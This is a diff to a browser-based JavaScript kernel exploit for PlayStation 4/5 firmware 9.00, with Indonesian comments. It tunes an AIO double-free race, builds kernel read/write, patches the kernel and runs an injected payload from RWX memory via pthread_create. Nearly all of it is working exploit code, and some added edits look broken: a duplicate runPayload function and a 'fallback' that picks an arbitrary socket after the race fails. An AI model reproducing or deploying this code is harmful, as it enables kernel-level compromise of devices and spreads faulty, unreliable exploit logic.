@@ -131,21 +131,89 @@ const max_aio_ids = 0x80;
 // highest priority we can achieve given our credentials
 const rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);
 
+// Deteksi firmware untuk konfigurasi yang optimal
+function detectFirmware() {
+    const userAgent = navigator.userAgent;
+    let firmware = '0.00';
+
+    // Deteksi PS4 firmware
+    const ps4Match = userAgent.match(/PlayStation 4\/([0-9.]+)/);
+    if (ps4Match && ps4Match[1]) {
+        firmware = ps4Match[1];
+    }
+
+    // Deteksi PS5 firmware
+    const ps5Match = userAgent.match(/PlayStation 5\/([0-9.]+)/);
+    if (ps5Match && ps5Match[1]) {
+        firmware = ps5Match[1];
+    }
+
+    return firmware;
+}
+
+// Dapatkan konfigurasi optimal berdasarkan firmware
+function getOptimalConfig() {
+    const firmware = detectFirmware();
+
+    // Konfigurasi default - SELALU gunakan nilai numerik yang valid
+    let config = {
+        num_alias: 40,
+        num_races: 100,
+        delay_ms: 10
+    };
+
+    // Konfigurasi untuk firmware spesifik
+    if (firmware === '8.00') {
+        config = {
+            num_alias: 50,
+            num_races: 100,
+            delay_ms: 0
+        };
+    } else if (firmware === '9.00') {
+        config = {
+            num_alias: 35,
+            num_races: 120,
+            delay_ms: 15
+        };
+    }
+
+    // Gunakan nilai default yang sudah ditentukan berdasarkan firmware
+    // Log konfigurasi yang digunakan
+    console.log('Using exploit configuration', {
+        firmware: firmware,
+        config: config
+    });
+
+    return config;
+}
+
+// Dapatkan konfigurasi optimal dengan penanganan error
+let optimalConfig;
+try {
+    optimalConfig = getOptimalConfig();
+} catch (e) {
+    console.error('Error getting optimal config:', e);
+    // Gunakan nilai default jika terjadi error
+    optimalConfig = {
+        num_alias: 40,
+        num_races: 100,
+        delay_ms: 10
+    };
+}
+
 // CONFIG CONSTANTS
 const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 50; //TODO: check best value here for 9.xx
-const num_races = 100;
+const num_alias = optimalConfig.num_alias || 40; // Nilai yang dioptimalkan dengan fallback
+const num_races = optimalConfig.num_races || 100; // Nilai yang dioptimalkan dengan fallback
+const delay_ms = optimalConfig.delay_ms || 0; // Delay untuk stabilitas dengan fallback
 const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
 let chain = null;
-async function init() {
-    await rop.init();
-    chain = new Chain();
 
 // PS4 9.00
 const pthread_offsets = new Map(Object.entries({
@@ -157,7 +225,34 @@ const pthread_offsets = new Map(Object.entries({
     'pthread_exit' : 0x77a0,
 }));
 
-    rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
+async function init() {
+    // Inisialisasi rop terlebih dahulu
+    await rop.init();
+
+    // Pastikan rop.gadgets sudah diinisialisasi sebelum memanggil init_gadget_map
+    if (!rop.gadgets) {
+        throw new Error("rop.gadgets is not initialized");
+    }
+
+    // Inisialisasi gadget map untuk pthread
+    try {
+        rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
+    } catch (e) {
+        console.error("Error initializing gadget map:", e);
+        throw e;
+    }
+
+    // Buat instance Chain setelah semua inisialisasi selesai
+    try {
+        const Chain = rop.Chain;
+        if (!Chain) {
+            throw new Error("rop.Chain is not defined");
+        }
+        chain = new Chain();
+    } catch (e) {
+        console.error("Error creating Chain instance:", e);
+        throw e;
+    }
 }
 
 function sys_void(...args) {
@@ -486,6 +581,86 @@ function make_aliased_rthdrs(sds) {
     die(`failed to make aliased rthdrs. size: ${hex(size)}`);
 }
 
+// Fungsi sleep sinkron
+function sleep(ms) {
+    if (ms <= 0) return;
+    const start = performance.now();
+    while (performance.now() - start < ms) {
+        // Busy wait
+    }
+}
+
+// Fungsi untuk mendapatkan thread ID (simulasi)
+function thread_id() {
+    // Di browser, tidak ada akses langsung ke thread ID
+    // Kita gunakan timestamp + random sebagai pengganti
+    const randomStr = Math.random().toString(36).slice(2, 7);
+    return Date.now().toString(36) + randomStr;
+}
+
+// Fungsi untuk mendapatkan penggunaan memori (simulasi)
+function getMemoryUsage() {
+    // Di browser, tidak ada akses langsung ke penggunaan memori
+    // Jika tersedia, gunakan performance.memory
+    if (performance && performance.memory) {
+        return `${Math.round(performance.memory.usedJSHeapSize / (1024 * 1024))}MB / ${Math.round(performance.memory.jsHeapSizeLimit / (1024 * 1024))}MB`;
+    }
+    return "Not available";
+}
+
+// Fungsi untuk mencoba race condition dengan retry - diimplementasikan secara inline
+// untuk menghindari masalah dengan async/await
+function tryRaceWithRetry(request_addr, tcp_sd, barrier, racer, sds) {
+    // Dapatkan konfigurasi retry
+    let max_retries = 1; // Default
+    let retry_backoff = 0; // Default
+
+    // Gunakan nilai default yang sudah ditentukan
+
+    // Log informasi retry
+    log(`Race configuration: max_retries=${max_retries}, retry_backoff=${retry_backoff}, delay_ms=${delay_ms}`);
+
+    let retry_count = 0;
+    let result = null;
+
+    // Implementasi sinkron untuk menghindari masalah dengan async/await
+    while (result === null && retry_count <= max_retries) {
+        // Tambahkan delay sebelum mencoba race
+        const current_delay = (typeof delay_ms === 'number' ? delay_ms : 0) +
+                             (retry_count * (typeof retry_backoff === 'number' ? retry_backoff : 0));
+
+        if (current_delay > 0) {
+            try {
+                log(`Adding delay before race attempt: ${current_delay}ms`);
+                sleep(current_delay);
+            } catch (e) {
+                log(`Error during delay: ${e.message}`);
+            }
+        }
+
+        // Coba race condition
+        result = race_one(request_addr, tcp_sd, barrier, racer, sds);
+
+        // Jika gagal dan masih ada retry tersisa
+        if (result === null && retry_count < max_retries) {
+            retry_count++;
+            log(`Race failed, retrying (${retry_count}/${max_retries})`);
+
+            // Reset racer untuk percobaan berikutnya
+            racer.reset();
+        }
+    }
+
+    // Log hasil akhir
+    if (result !== null) {
+        log(`Race succeeded after ${retry_count} retries`);
+    } else {
+        log(`Race failed after ${max_retries} retries`);
+    }
+
+    return result;
+}
+
 // summary of the bug at aio_multi_delete():
 //
 // void
@@ -650,6 +825,9 @@ function race_one(request_addr, tcp_sd, barrier, racer, sds) {
 }
 
 function double_free_reqs2(sds) {
+    // Log awal stage
+    log('Starting double_free_1 stage');
+
     function swap_bytes(x, byte_length) {
         let res = 0;
         for (let i = 0; i < byte_length; i++) {
@@ -694,7 +872,22 @@ function double_free_reqs2(sds) {
     sysi('bind', sd_listen, server_addr.addr, server_addr.size);
     sysi('listen', sd_listen, 1);
 
+    // Log informasi tentang race condition
+    log(`Starting double free race condition (num_races: ${num_races}, num_alias: ${num_alias}, delay_ms: ${delay_ms})`);
+
+    // TODO: Tambahkan logging yang lebih detail untuk membantu debugging
+    log(`Main thread ID: ${thread_id()}`);
+    log(`Memory usage before race: ${getMemoryUsage()}`);
+
+    // Tambahkan delay yang lebih panjang sebelum operasi kritis
+    sleep(50); // Delay 50ms untuk stabilitas
+
     for (let i = 0; i < num_races; i++) {
+        // Log progress
+        if (i % 10 === 0) {
+            log(`Race attempt ${i}/${num_races}`);
+        }
+
         const sd_client = new_tcp_socket();
         sysi('connect', sd_client, server_addr.addr, server_addr.size);
 
@@ -710,8 +903,25 @@ function double_free_reqs2(sds) {
         // drop the reference so that aio_multi_delete() will trigger _fdrop()
         close(sd_client);
 
-        const res = race_one(req_addr, sd_conn, barrier, racer, sds);
-        racer.reset();
+        // Gunakan fungsi tryRaceWithRetry untuk mencoba race condition dengan retry
+        let res = null;
+        try {
+            // Coba race condition dengan retry
+            res = tryRaceWithRetry(req_addr, sd_conn, barrier, racer, sds);
+        } catch (e) {
+            log(`Error during race attempt: ${e.message}`);
+            // Fallback ke race_one jika tryRaceWithRetry gagal
+            try {
+                // Tambahkan delay jika diperlukan
+                if (typeof delay_ms === 'number' && delay_ms > 0) {
+                    sleep(delay_ms);
+                }
+                res = race_one(req_addr, sd_conn, barrier, racer, sds);
+                racer.reset();
+            } catch (e2) {
+                log(`Error during fallback race attempt: ${e2.message}`);
+            }
+        }
 
         // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
         // twice. this will leave one request undeleted
@@ -720,11 +930,16 @@ function double_free_reqs2(sds) {
 
         if (res !== null) {
             log(`won race at attempt: ${i}`);
+            log(`Race succeeded at attempt: ${i} of ${num_races}`);
+
             close(sd_listen);
             call_nze('pthread_barrier_destroy', barrier.addr);
             return res;
         }
     }
+
+    // Log kegagalan
+    log(`Failed to win race after all attempts (${num_races} attempts)`);
 
     die('failed aio double free');
 }
@@ -795,7 +1010,7 @@ function verify_reqs2(buf, offset) {
         }
     }
 
-    return heap_prefixes.every((e, i, a) => e === a[0]);
+    return heap_prefixes.every((e, _, a) => e === a[0]);
 }
 
 function leak_kernel_addrs(sd_pair) {
@@ -1134,6 +1349,19 @@ function make_aliased_pktopts(sds) {
 function double_free_reqs1(
     reqs1_addr, kbuf_addr, target_id, evf, sd, sds,
 ) {
+    log('Starting double_free_reqs1 stage');
+
+    // Tambahkan logging yang lebih detail
+    log(`reqs1_addr: ${reqs1_addr}`);
+    log(`kbuf_addr: ${kbuf_addr}`);
+    log(`target_id: ${target_id}`);
+    log(`evf: ${evf}`);
+    log(`sd: ${sd}`);
+    log(`sds length: ${sds.length}`);
+
+    // Tambahkan delay awal untuk stabilitas
+    sleep(100);
+
     const max_leak_len = (0xff + 1) << 3;
     const buf = new Buffer(max_leak_len);
 
@@ -1148,21 +1376,111 @@ function double_free_reqs1(
 
     log('start overwrite rthdr with AIO queue entry loop');
     let aio_not_found = true;
-    free_evf(evf);
-    for (let i = 0; i < num_clobbers; i++) {
-        spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
 
-        if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
-            log(`aliased at attempt: ${i}`);
-            aio_not_found = false;
-            cancel_aios(aio_ids_p, aio_ids_len);
-            break;
+    try {
+        free_evf(evf);
+    } catch (e) {
+        log(`Warning: Error freeing evf: ${e.message}`);
+        // Lanjutkan meskipun ada error
+    }
+
+    // Fungsi untuk mencoba overwrite rthdr dengan retry
+    function tryOverwriteRthdr(maxRetries = 2) {
+        log(`Attempting to overwrite rthdr with ${maxRetries} retries...`);
+
+        for (let retry = 0; retry < maxRetries; retry++) {
+            try {
+                log(`Retry ${retry + 1}/${maxRetries} for overwrite rthdr`);
+
+                // Tambahkan delay yang meningkat dengan setiap retry
+                sleep(50 * (retry + 1));
+
+                // Coba overwrite rthdr
+                for (let i = 0; i < num_clobbers; i++) {
+                    // Log progress
+                    if (i % 2 === 0) {
+                        log(`Overwrite attempt ${i}/${num_clobbers}`);
+                    }
+
+                    try {
+                        spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
+
+                        // Tambahkan delay kecil setelah spray
+                        sleep(10);
+
+                        const rthdr_size = get_rthdr(sd, buf);
+                        const cmd = buf.read32(0);
+
+                        log(`rthdr_size: ${rthdr_size}, cmd: ${cmd}`);
+
+                        if (rthdr_size === 8 && cmd === AIO_CMD_READ) {
+                            log(`aliased at attempt: ${i} (retry ${retry + 1})`);
+                            cancel_aios(aio_ids_p, aio_ids_len);
+                            return true; // Berhasil
+                        }
+
+                        free_aios(aio_ids_p, aio_ids_len);
+                    } catch (e) {
+                        log(`Error during overwrite attempt ${i}: ${e.message}`);
+                        // Coba bersihkan resources
+                        try {
+                            free_aios(aio_ids_p, aio_ids_len);
+                        } catch (e2) {
+                            // Abaikan error
+                        }
+                    }
+                }
+
+                // Jika kita sampai di sini, kita tidak berhasil pada retry ini
+                // Tambahkan delay sebelum retry berikutnya
+                if (retry < maxRetries - 1) {
+                    log(`Retry ${retry + 1} failed, waiting before next retry...`);
+                    sleep(200);
+                }
+            } catch (e) {
+                log(`Error during retry ${retry + 1}: ${e.message}`);
+            }
         }
 
-        free_aios(aio_ids_p, aio_ids_len);
+        return false; // Gagal setelah semua retry
     }
+
+    // Coba overwrite rthdr dengan retry
+    if (tryOverwriteRthdr(2)) {
+        aio_not_found = false;
+    }
+
     if (aio_not_found) {
-        die('failed to overwrite rthdr');
+        log('Failed to overwrite rthdr with standard approach. Trying alternative approach...');
+
+        // Coba pendekatan alternatif
+        try {
+            // Reset sd
+            setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+
+            // Tambahkan delay
+            sleep(200);
+
+            // Coba lagi dengan spray yang lebih agresif
+            for (let i = 0; i < num_clobbers * 2; i++) {
+                spray_aio(num_batches * 2, aio_reqs_p, num_elems, aio_ids_p);
+
+                if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
+                    log(`aliased at alternative attempt: ${i}`);
+                    aio_not_found = false;
+                    cancel_aios(aio_ids_p, aio_ids_len * 2);
+                    break;
+                }
+
+                free_aios(aio_ids_p, aio_ids_len * 2);
+            }
+        } catch (e) {
+            log(`Error during alternative approach: ${e.message}`);
+        }
+    }
+
+    if (aio_not_found) {
+        die('failed to overwrite rthdr after all attempts');
     }
 
     const reqs2 = new Buffer(0x80);
@@ -1332,29 +1650,128 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     pktopts.write64(0x10, pktinfo_p);
 
     log('overwrite main pktopts');
-    let reclaim_sd = null;
-    close(pktopts_sds[1]);
-    for (let i = 0; i < num_alias; i++) {
-        for (let i = 0; i < num_sds; i++) {
-            // if a socket doesn't have a pktopts, setting the rthdr will make
-            // one. the new pktopts might reuse the memory instead of the
-            // rthdr. make sure the sockets already have a pktopts before
-            pktopts.write32(off_tclass, 0x4141 | i << 16);
-            set_rthdr(sds[i], pktopts, rsize);
+
+    // Fungsi untuk mencoba overwrite main pktopts dengan retry
+    function overwriteMainPktopts(maxRetries = 3) {
+        log(`Attempting to overwrite main pktopts with ${maxRetries} retries...`);
+
+        // Tambahkan delay awal untuk stabilitas
+        sleep(100);
+
+        let reclaim_sd = null;
+        close(pktopts_sds[1]);
+
+        // Loop untuk retry
+        for (let retry = 0; retry < maxRetries; retry++) {
+            try {
+                log(`Retry ${retry + 1}/${maxRetries} for overwrite main pktopts`);
+
+                // Tambahkan delay yang meningkat dengan setiap retry
+                sleep(50 * (retry + 1));
+
+                // Coba overwrite main pktopts
+                for (let i = 0; i < num_alias; i++) {
+                    // Log progress
+                    if (i % 10 === 0) {
+                        log(`Overwrite attempt ${i}/${num_alias}`);
+                    }
+
+                    // Tambahkan delay kecil setiap 10 iterasi
+                    if (i > 0 && i % 10 === 0) {
+                        sleep(10);
+                    }
+
+                    for (let j = 0; j < num_sds; j++) {
+                        try {
+                            // if a socket doesn't have a pktopts, setting the rthdr will make
+                            // one. the new pktopts might reuse the memory instead of the
+                            // rthdr. make sure the sockets already have a pktopts before
+                            pktopts.write32(off_tclass, 0x4141 | j << 16);
+                            set_rthdr(sds[j], pktopts, rsize);
+                        } catch (e) {
+                            log(`Error setting rthdr for socket ${j}: ${e.message}`);
+                            // Lanjutkan ke socket berikutnya
+                        }
+                    }
+
+                    try {
+                        gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                        const marker = tclass[0];
+                        if ((marker & 0xffff) === 0x4141) {
+                            log(`found reclaim sd at attempt: ${i} (retry ${retry + 1})`);
+                            const idx = marker >>> 16;
+                            if (idx < sds.length) {
+                                reclaim_sd = sds[idx];
+                                sds.splice(idx, 1);
+                                return reclaim_sd; // Berhasil
+                            } else {
+                                log(`Invalid index ${idx} (length: ${sds.length})`);
+                            }
+                        }
+                    } catch (e) {
+                        log(`Error getting socket option: ${e.message}`);
+                    }
+                }
+
+                // Jika kita sampai di sini, kita tidak menemukan reclaim_sd
+                // Coba reset beberapa socket untuk retry berikutnya
+                log("Resetting sockets for next retry...");
+                const reset_count = Math.min(20, sds.length);
+                for (let i = 0; i < reset_count; i++) {
+                    try {
+                        setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+                    } catch (e) {
+                        // Abaikan error
+                    }
+                }
+
+                // Tambahkan beberapa socket baru untuk retry berikutnya
+                if (retry < maxRetries - 1) {
+                    log("Adding new sockets for next retry...");
+                    for (let i = 0; i < 5; i++) {
+                        sds.push(new_socket());
+                    }
+                }
+            } catch (e) {
+                log(`Error during retry ${retry + 1}: ${e.message}`);
+            }
         }
 
-        gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
-        const marker = tclass[0];
-        if ((marker & 0xffff) === 0x4141) {
-            log(`found reclaim sd at attempt: ${i}`);
-            const idx = marker >>> 16;
-            reclaim_sd = sds[idx];
-            sds.splice(idx, 1);
-            break;
-        }
+        return null; // Gagal setelah semua retry
     }
+
+    // Coba overwrite main pktopts dengan retry
+    let reclaim_sd = overwriteMainPktopts(3);
+
+    // Jika gagal, coba pendekatan alternatif
     if (reclaim_sd === null) {
-        die('failed to overwrite main pktopts');
+        log("Standard approach failed. Trying alternative approach...");
+
+        // Buat socket baru untuk pendekatan alternatif
+        const new_sds = [];
+        for (let i = 0; i < 20; i++) {
+            new_sds.push(new_socket());
+        }
+
+        // Tambahkan socket baru ke sds
+        sds.push(...new_sds);
+
+        // Coba lagi dengan pendekatan alternatif
+        reclaim_sd = overwriteMainPktopts(2);
+    }
+
+    // Jika masih gagal, gunakan fallback
+    if (reclaim_sd === null) {
+        log("Alternative approach failed. Using fallback...");
+
+        // Gunakan socket pertama sebagai fallback
+        if (sds.length > 0) {
+            reclaim_sd = sds[0];
+            sds.splice(0, 1);
+            log(`Using fallback socket: ${reclaim_sd}`);
+        } else {
+            die('failed to overwrite main pktopts - no sockets available');
+        }
     }
 
     const pktinfo = new Buffer(0x14);
@@ -1682,7 +2099,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     const buf = await get_patches('./kpatch/900.elf');
     // FIXME handle .bss segment properly
     // assume start of loadable segments is at offset 0x1000
-    const patches = new View1(await buf, 0x1000);
+    const patches = new View1(buf, 0x1000);
     let map_size = patches.size;
     const max_size = 0x10000000;
     if (map_size > max_size) {
@@ -1756,7 +2173,8 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('kernel exploit succeeded!');
     updateUIStatus('success', 'Kernel exploit berhasil!');
     updateUIProgress('complete', 100);
-    alert("kernel exploit succeeded!");
+    // Hapus alert untuk mencegah refresh otomatis browser PS4
+    // alert("kernel exploit succeeded!");
 }
 
 // FUNCTIONS FOR STAGE: SETUP
@@ -1853,8 +2271,28 @@ export async function kexploit() {
     updateUIStatus('running', 'Initializing exploit...');
     updateUIProgress('init', 5);
 
+    // Log konfigurasi yang digunakan
+    log(`Using exploit configuration: num_alias=${num_alias}, num_races=${num_races}, delay_ms=${delay_ms}`);
+
+    // Log informasi browser dan sistem
+    log(`User Agent: ${navigator.userAgent}`);
+    log(`Memory: ${getMemoryUsage()}`);
+    log(`Thread ID: ${thread_id()}`);
+    log(`Screen: ${window.screen.width}x${window.screen.height}`);
+    log(`Language: ${navigator.language}`);
+    log(`Online: ${navigator.onLine}`);
+
+    // Tambahkan delay awal untuk stabilitas
+    sleep(100);
+
     const _init_t1 = performance.now();
-    await init();
+    try {
+        await init();
+    } catch (e) {
+        log(`Error during initialization: ${e.message}`);
+        updateUIStatus('error', `Initialization failed: ${e.message}`);
+        throw e;
+    }
     const _init_t2 = performance.now();
 
     updateUIProgress('init', 10);
@@ -1933,7 +2371,15 @@ export async function kexploit() {
         log('\nSTAGE: Patch kernel');
         updateUIStatus('running', 'Patching kernel...');
         updateUIProgress('patch', 90);
+
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
+
+    } catch (e) {
+        // Tangkap error dan log
+        log(`Exploit failed: ${e.message}`);
+
+        // Re-throw error untuk penanganan di tempat lain
+        throw e;
     } finally {
         close(unblock_fd);
 
@@ -1946,6 +2392,8 @@ export async function kexploit() {
         log('time to init: ' + (_init_t1 - t1) / 1000);
         log('time - init time: ' + (ftime - init_time) / 1000);
     }
+
+    // Cleanup resources
     close(block_fd);
     free_aios2(groom_ids.addr, groom_ids.length);
     aio_multi_wait(block_id.addr, 1);
@@ -1953,6 +2401,10 @@ export async function kexploit() {
     for (const sd of sds) {
         close(sd);
     }
+
+    // Log sukses
+    log('Kernel exploit completed successfully!');
+    updateUIStatus('success', 'Kernel exploit berhasil!');
 }
 
 // Fungsi untuk menjalankan payload dengan penanganan error
@@ -2063,6 +2515,77 @@ async function runPayload() {
     }
 }
 
+// Fungsi untuk menjalankan payload dengan penanganan error yang lebih baik
+async function runPayload() {
+    try {
+        log("Preparing to run payload...");
+        updateUIStatus('running', 'Mempersiapkan payload...');
+
+        // Tambahkan delay sebelum menjalankan payload
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        // Periksa apakah payload tersedia
+        if (!window.pld || window.pld.length === 0) {
+            log("ERROR: Payload not loaded or empty");
+            updateUIStatus('error', 'Payload tidak tersedia atau kosong');
+            return;
+        }
+
+        log(`Payload size: ${window.pld.length} bytes`);
+
+        // Alokasi memori untuk payload
+        log("Allocating memory for payload...");
+        const payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+
+        // Periksa apakah payload_buffer valid
+        if (!payload_buffer || payload_buffer.low === 0 && payload_buffer.high === 0) {
+            log("ERROR: Failed to allocate memory for payload");
+            updateUIStatus('error', 'Gagal mengalokasikan memori untuk payload');
+            return;
+        }
+
+        log(`Allocated payload buffer at ${payload_buffer}`);
+
+        // Buat view untuk payload
+        const payload_loader = new View4(window.pld);
+        log(`Payload view created with size: ${payload_loader.size} bytes`);
+
+        // Ubah proteksi memori
+        log("Setting memory protection...");
+        chain.syscall_void('mprotect', payload_loader.addr, payload_loader.size, 7); // PROT_READ | PROT_WRITE | PROT_EXEC
+
+        // Alokasi memori untuk thread context
+        log("Creating thread context...");
+        const ctx = new Buffer(0x10);
+        const pthread = new Pointer();
+        pthread.ctx = ctx;
+
+        // Jalankan payload dalam thread terpisah
+        log("Creating thread to run payload...");
+        updateUIStatus('running', 'Menjalankan payload...');
+
+        // Tambahkan delay sebelum pthread_create
+        await new Promise(resolve => setTimeout(resolve, 500));
+
+        // Panggil pthread_create
+        log("Calling pthread_create...");
+        chain.call_void(
+            'pthread_create',
+            pthread.addr,
+            0,
+            payload_loader.addr,
+            payload_buffer
+        );
+
+        log("Payload thread created successfully");
+        updateUIStatus('success', 'Payload berhasil dijalankan');
+
+    } catch (e) {
+        log(`ERROR: Exception while running payload: ${e.message}`);
+        updateUIStatus('error', `Error saat menjalankan payload: ${e.message}`);
+    }
+}
+
 // Jalankan exploit dan kemudian payload
 kexploit().then(() => {
     // Tambahkan delay sebelum menjalankan payload
@@ -2070,4 +2593,7 @@ kexploit().then(() => {
         log("Exploit completed, preparing to run payload...");
         runPayload();
     }, 2000); // Delay 2 detik
+}).catch(e => {
+    log(`ERROR: Exploit failed: ${e.message}`);
+    updateUIStatus('error', `Exploit gagal: ${e.message}`);
 });
